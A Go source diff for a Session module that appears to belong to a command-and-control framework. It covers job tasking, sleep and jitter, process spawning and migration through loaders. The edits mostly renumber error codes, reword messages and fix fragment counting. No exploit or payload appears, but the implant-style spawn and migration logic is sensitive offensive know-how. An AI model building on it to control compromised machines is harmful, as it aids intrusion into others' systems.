@@ -26,7 +26,7 @@ import (
 
 const (
 	sleepMod  = 5
-	maxErrors = 3
+	maxErrors = 5
 
 	spawnDefaultTime = time.Second * 10
 )
@@ -39,15 +39,15 @@ var (
 	// This is more of an informational message than an error, as this does NOT
 	// indicate that the function failed, but that the Job object should NOT be
 	// used as it is nil. (In case the Job object is not checked.)
-	ErrNoTask = xerr.Sub("no Job created for client Session", 0x5)
+	ErrNoTask = xerr.Sub("no Job created for client Session", 0x1D)
 	// ErrFullBuffer is returned from the WritePacket function when the send
 	// buffer for the Session is full.
 	//
 	// This error also indicates that a call to 'Send' would block.
-	ErrFullBuffer = xerr.Sub("buffer is full", 0x7)
+	ErrFullBuffer = xerr.Sub("send buffer is full", 0x1E)
 	// ErrInvalidPacketCount is returned when attempting to read a packet marked
 	// as multi or frag an the total count returned is zero.
-	ErrInvalidPacketCount = xerr.Sub("frag/multi total is zero on a frag/multi packet", 0xE)
+	ErrInvalidPacketCount = xerr.Sub("frag/multi total is zero on a frag/multi packet", 0x1F)
 )
 
 // Session is a struct that represents a connection between the client and the
@@ -643,25 +643,6 @@ func (s *Session) session(c net.Conn) bool {
 	s.state.Unset(stateChannel)
 	return true
 }
-func (s *Session) frag(i, max, cur uint16) {
-	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
-		return
-	}
-	s.lock.RLock()
-	j, ok := s.jobs[i]
-	if s.lock.RUnlock(); !ok {
-		return
-	}
-	if j.Frags == 0 {
-		j.Status = StatusReceiving
-	}
-	if j.Frags, j.Current = max, cur; j.Update != nil {
-		s.m.queue(event{j: j, jf: j.Update})
-	}
-	if cout.Enabled {
-		s.log.Trace("[%s/Frag] Tracking Frag Group %X, Current %d of %d.", s.ID, i, cur, max)
-	}
-}
 func (s *Session) pick(i bool) *com.Packet {
 	if s.peek != nil {
 		n := s.peek
@@ -772,6 +753,25 @@ func (s *Session) handle(p *com.Packet) bool {
 	}
 	return true
 }
+func (s *Session) frag(i, id, max, cur uint16) {
+	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
+		return
+	}
+	s.lock.RLock()
+	j, ok := s.jobs[i]
+	if s.lock.RUnlock(); !ok {
+		return
+	}
+	if j.Frags == 0 {
+		j.Status = StatusReceiving
+	}
+	if j.Frags, j.Current = max, cur; j.Update != nil {
+		s.m.queue(event{j: j, jf: j.Update})
+	}
+	if cout.Enabled {
+		s.log.Trace("[%s/Frag] Tracking Job %d Frag Group %X, Current %d of %d.", s.ID, i, id, cur+1, max)
+	}
+}
 
 // Packets will create and setup the Packet receiver channel. This function will
 // then return the read-only Packet channel for use.
@@ -816,17 +816,17 @@ func (s *Session) SetJitter(j int) (*Job, error) {
 // full.
 func (s *Session) Task(n *com.Packet) (*Job, error) {
 	if n == nil {
-		return nil, xerr.Sub("empty or nil Job", 0x9)
+		return nil, xerr.Sub("empty or nil Job", 0x20)
 	}
 	if s.parent == nil || s.jobs == nil {
-		return nil, xerr.Sub("cannot be a client session", 0x5)
+		return nil, xerr.Sub("cannot be a client session", 0x21)
 	}
 	if s.isMoving() {
-		return nil, xerr.Sub("migration in progress", 0x4)
+		return nil, xerr.Sub("migration in progress", 0x22)
 	}
 	if n.Job == 0 {
 		if n.Job = s.newJobID(); n.Job == 0 {
-			return nil, xerr.Sub("cannot assign a Job ID", 0x7)
+			return nil, xerr.Sub("cannot assign a Job ID", 0x23)
 		}
 	}
 	if n.Device.Empty() {
@@ -836,9 +836,9 @@ func (s *Session) Task(n *com.Packet) (*Job, error) {
 	_, ok := s.jobs[n.Job]
 	if s.lock.RUnlock(); ok {
 		if xerr.Concat {
-			return nil, xerr.Sub("job ID "+strconv.Itoa(int(n.Job))+" is in use", 0x15)
+			return nil, xerr.Sub("job ID "+strconv.Itoa(int(n.Job))+" is in use", 0x24)
 		}
-		return nil, xerr.Sub("job ID is in use", 0x15)
+		return nil, xerr.Sub("job ID is in use", 0x24)
 	}
 	if err := s.write(false, n); err != nil {
 		return nil, err
@@ -870,7 +870,10 @@ func (s *Session) write(w bool, n *com.Packet) error {
 		}
 		return nil
 	}
-	m := (n.Size() / limits.Frag) + 1
+	m := (n.Size() / limits.Frag)
+	if (m+1)*limits.Frag < n.Size() {
+		m++
+	}
 	if !w && len(s.send)+m >= cap(s.send) {
 		return ErrFullBuffer
 	}
@@ -880,7 +883,8 @@ func (s *Session) write(w bool, n *com.Packet) error {
 		err  error
 		t, v int64
 	)
-	for i := 0; i <= m && t < x; i++ {
+	m++
+	for i := 0; i < m && t < x; i++ {
 		c := &com.Packet{ID: n.ID, Job: n.Job, Flags: n.Flags, Chunk: data.Chunk{Limit: limits.Frag}}
 		c.Flags.SetGroup(g)
 		c.Flags.SetLen(uint16(m))
@@ -890,6 +894,7 @@ func (s *Session) write(w bool, n *com.Packet) error {
 			c.Flags.SetPosition(0)
 			c.Flags.Set(com.FlagError)
 			c.Reset()
+			c.WriteUint8(0)
 		}
 		t += v
 		if s.queue(c); s.state.Channel() {
@@ -921,11 +926,11 @@ func (s *Session) setProfile(b []byte) (*Job, error) {
 // Job object result is nil.
 func (s *Session) SetProfile(p Profile) (*Job, error) {
 	if p == nil {
-		return nil, xerr.Sub("empty or nil Profile", 0x9)
+		return nil, ErrInvalidProfile
 	}
 	m, ok := p.(marshaler)
 	if !ok {
-		return nil, xerr.Sub("cannot marshal Profile", 0xC)
+		return nil, xerr.Sub("cannot marshal Profile", 0x25)
 	}
 	b, err := m.MarshalBinary()
 	if err != nil {
@@ -946,7 +951,7 @@ func (s *Session) SetProfile(p Profile) (*Job, error) {
 // is a client-side Session, Job ID is already or the scheduler is full.
 func (s *Session) Tasklet(t task.Tasklet) (*Job, error) {
 	if t == nil {
-		return nil, xerr.Sub("empty or nil Tasklet", 0x9)
+		return nil, xerr.Sub("empty or nil Tasklet", 0x26)
 	}
 	n, err := t.Packet()
 	if err != nil {
@@ -979,7 +984,7 @@ func (s *Session) SetSleep(t time.Duration) (*Job, error) {
 // Job object result is nil.
 func (s *Session) SetProfileBytes(b []byte) (*Job, error) {
 	if ProfileParser == nil {
-		return nil, xerr.Sub("no Profile parser loaded", 0x8)
+		return nil, xerr.Sub("no Profile parser loaded", 0x15)
 	}
 	p, err := ProfileParser(b)
 	if err != nil {
@@ -1068,20 +1073,20 @@ func (s *Session) Migrate(wait bool, n string, job uint16, r runnable) (uint32, 
 // may have occurred during the Spawn.
 func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) (uint32, error) {
 	if s.s != nil {
-		return 0, xerr.Sub("must be a client session", 0x5)
+		return 0, xerr.Sub("must be a client session", 0x21)
 	}
 	if s.isMoving() {
-		return 0, xerr.Sub("migration in progress", 0x4)
+		return 0, xerr.Sub("migration in progress", 0x22)
 	}
 	if len(n) == 0 {
-		return 0, xerr.Sub("invalid name", 0xA)
+		return 0, xerr.Sub("empty or invalid loader name", 0x14)
 	}
 	var err error
 	if len(b) == 0 {
 		// ^ Use our own Profile if one is not provided.
 		p, ok := s.p.(marshaler)
 		if !ok {
-			return 0, xerr.Sub("cannot marshal Profile", 0xC)
+			return 0, xerr.Sub("cannot marshal Profile", 0x25)
 		}
 		if b, err = p.MarshalBinary(); err != nil {
 			return 0, xerr.Wrap("cannot marshal Profile", err)
@@ -1127,7 +1132,7 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 		return 0, err
 	}
 	if c.Close(); buf[0] != 'O' && buf[1] != 'K' {
-		return 0, xerr.Sub("unexpected value", 0x3)
+		return 0, xerr.Sub("unexpected OK value", 0x16)
 	}
 	if cout.Enabled {
 		s.log.Info("[%s/SpN] Received 'OK' from new process, Spawn complete!", s.ID)
@@ -1154,27 +1159,27 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 // may have occurred during Migration.
 func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t time.Duration, e runnable) (uint32, error) {
 	if s.s != nil {
-		return 0, xerr.Sub("must be a client session", 0x5)
+		return 0, xerr.Sub("must be a client session", 0x21)
 	}
 	if s.isMoving() {
-		return 0, xerr.Sub("migration in progress", 0x4)
+		return 0, xerr.Sub("migration in progress", 0x22)
 	}
 	if len(n) == 0 {
-		return 0, xerr.Sub("invalid name", 0xA)
+		return 0, xerr.Sub("empty or invalid loader name", 0x14)
 	}
 	var err error
 	if len(b) == 0 {
 		// ^ Use our own Profile if one is not provided.
 		p, ok := s.p.(marshaler)
 		if !ok {
-			return 0, xerr.Sub("cannot marshal Profile", 0xC)
+			return 0, xerr.Sub("cannot marshal Profile", 0x25)
 		}
 		if b, err = p.MarshalBinary(); err != nil {
 			return 0, xerr.Wrap("cannot marshal Profile", err)
 		}
 	}
 	if !s.checkProxyMarshal() {
-		return 0, xerr.Sub("cannot marshal Proxy data", 0xC)
+		return 0, xerr.Sub("cannot marshal Proxy data", 0x27)
 	}
 	if cout.Enabled {
 		s.log.Info("[%s/Mg8] Starting Migrate process!", s.ID)
@@ -1262,7 +1267,7 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
-		return 0, xerr.Sub("unexpected OK value", 0x3)
+		return 0, xerr.Sub("unexpected OK value", 0x16)
 	}
 	if s.state.Set(stateClosing); cout.Enabled {
 		s.log.Debug("[%s/Mg8] Received 'OK' from host, proceeding with shutdown!", s.ID)
